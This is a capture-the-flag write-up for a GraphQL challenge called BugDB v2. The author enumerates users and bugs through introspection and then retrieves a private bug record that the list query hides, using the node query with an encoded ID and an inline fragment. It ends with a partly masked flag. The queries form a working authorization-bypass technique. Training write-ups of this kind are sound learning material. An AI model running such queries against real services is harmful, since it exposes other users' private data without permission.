# BugDB v2

## open website found

<img width="1919" height="551" alt="image" src="https://github.com/user-attachments/assets/ff9d77ed-0b54-41d4-87cf-4a0301299045" />

## By inspecting the request in Burp Suite, I noticed that an introspection query was being sent, which returned the full GraphQL schema.

<img width="1577" height="664" alt="image" src="https://github.com/user-attachments/assets/793fbbd2-01a4-4d36-aa7e-c6d1385d2afe" />

## https://nathanrandal.com/graphql-visualizer/

<img width="1916" height="846" alt="image" src="https://github.com/user-attachments/assets/c2053fe2-f876-495a-ba46-fe33e5afd98d" />

## first try to get all users 

```graphql
{
  allUsers(first: 100) {
              edges {
                 node {
                     id 
                     username
                    }
               }
          }     
}
```

## found two users :

<img width="885" height="319" alt="image" src="https://github.com/user-attachments/assets/b537be11-5a69-402e-998a-f273d7461f7e" />

## now try to get `allBugs` table content

```graphql
{
  allBugs {
             id
             reporterId
             text
             private
              reporter {
               id
               username
               }
          }     
}
```

## found bug `id` call **`Bugs:1`** and it wasn't private 

<img width="1491" height="405" alt="image" src="https://github.com/user-attachments/assets/277ba49d-1b2a-4faf-bcbc-8a5ff4b74d73" />

## what if i try to find **`Bugs:2`** id maybe it's private and there is filter on it on **`allBugs`** qurey

## so will try to get it form **`node`** Query by using **`... on bugs`**

```graphql
{
  node(id: "QnVnczoy") {
    ... on Bugs {
      id
      text
      private
      reporter {
        username
      }
    }
  }
}
```

🧨 why use `...on`
-----------------

You say to GraphQL:

> “If this node is a Bugs type → return this data.”

👉 explain:

- Go to the object with this ID
- If it is bug → execute what is inside (get id, text,....)

>[!note]
> if you search on user hidden change it to **`... on Users`** and change id to user id

<img width="1479" height="315" alt="image" src="https://github.com/user-attachments/assets/436c8f73-3501-4ac4-a685-b979f490fa6d" />

```
^FLAG^64a42351d6a04555f5e5edffe****************9d295f31d69f5465928222b$FLAG$
```

